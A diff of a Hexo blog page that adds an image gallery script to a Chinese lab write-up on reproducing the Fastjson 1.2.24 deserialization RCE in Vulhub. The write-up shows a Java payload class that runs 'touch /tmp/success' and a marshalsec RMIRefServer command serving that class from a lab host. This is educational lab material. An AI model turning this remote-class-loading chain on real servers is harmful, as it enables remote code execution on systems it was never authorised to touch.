@@ -74,6 +74,8 @@
     
 	<!-- mathjax -->
 	
+  
+  
 <meta name="generator" content="Hexo 7.3.0"></head>
 
 <body class="max-width mx-auto px3 ltr">
@@ -181,24 +183,29 @@
   
 
   <div class="content e-content" itemprop="articleBody">
-    <p><a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/fastjson/1.2.24-rce/">https://vulhub.org/#/environments/fastjson/1.2.24-rce/</a></p>
-<h2 id="玩玩这个漏洞"><a href="#玩玩这个漏洞" class="headerlink" title="玩玩这个漏洞"></a>玩玩这个漏洞</h2><p><img src="/../assets/img/image-52.png" alt="alt text"></p>
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><p><a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/fastjson/1.2.24-rce/">https://vulhub.org/#/environments/fastjson/1.2.24-rce/</a></p>
+<h2 id="玩玩这个漏洞"><a href="#玩玩这个漏洞" class="headerlink" title="玩玩这个漏洞"></a>玩玩这个漏洞</h2><p><a href="/../assets/img/image-52.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-52.png" alt="alt text"></a></p>
 <h2 id="借助项目"><a href="#借助项目" class="headerlink" title="借助项目"></a>借助项目</h2><p> <a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec.git">https://github.com/mbechler/marshalsec.git</a></p>
-<p><img src="/../assets/img/image-53.png" alt="alt text"></p>
-<h3 id="获取Jar"><a href="#获取Jar" class="headerlink" title="获取Jar"></a>获取Jar</h3><p><img src="/../assets/img/image-54.png" alt="alt text"></p>
-<h3 id="编译成功"><a href="#编译成功" class="headerlink" title="编译成功"></a>编译成功</h3><p><img src="/../assets/img/image-55.png" alt="alt text"></p>
-<h3 id="Demo-class"><a href="#Demo-class" class="headerlink" title="Demo.class"></a>Demo.class</h3><p><img src="/../assets/img/image-57.png" alt="alt text"></p>
+<p><a href="/../assets/img/image-53.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-53.png" alt="alt text"></a></p>
+<h3 id="获取Jar"><a href="#获取Jar" class="headerlink" title="获取Jar"></a>获取Jar</h3><p><a href="/../assets/img/image-54.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-54.png" alt="alt text"></a></p>
+<h3 id="编译成功"><a href="#编译成功" class="headerlink" title="编译成功"></a>编译成功</h3><p><a href="/../assets/img/image-55.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-55.png" alt="alt text"></a></p>
+<h3 id="Demo-class"><a href="#Demo-class" class="headerlink" title="Demo.class"></a>Demo.class</h3><p><a href="/../assets/img/image-57.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-57.png" alt="alt text"></a></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// javac TouchFile.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;touch&quot;</span>, <span class="string">&quot;/tmp/success&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 
 <h3 id="运行rmi程序"><a href="#运行rmi程序" class="headerlink" title="运行rmi程序"></a>运行rmi程序</h3><p><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.31.241:1234/#Demo&quot; 9999</code></p>
-<p><img src="/../assets/img/image-56.png" alt="alt text"></p>
-<p><img src="/../assets/img/image-59.png" alt="alt text"></p>
-<p><img src="/../assets/img/image-58.png" alt="alt text"></p>
+<p><a href="/../assets/img/image-56.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-56.png" alt="alt text"></a></p>
+<p><a href="/../assets/img/image-59.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-59.png" alt="alt text"></a></p>
+<p><a href="/../assets/img/image-58.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-58.png" alt="alt text"></a></p>
 <h3 id="一定要注意版本问题"><a href="#一定要注意版本问题" class="headerlink" title="一定要注意版本问题"></a>一定要注意版本问题</h3><p>java 版本和 javac 版本一定要一致，不然会出现问题</p>
-<p><img src="/../assets/img/image-60.png" alt="alt text"></p>
+<p><a href="/../assets/img/image-60.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-60.png" alt="alt text"></a></p>
 <p>应该使用第二个javac</p>
-
+</div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
   </div>
 </article>
 
@@ -374,6 +381,10 @@
           (document.getElementById('utterances_thread')).appendChild(script);
       }());
   </script>
+
+
+
+<!-- FancyBox -->
 
 </body>
 </html>
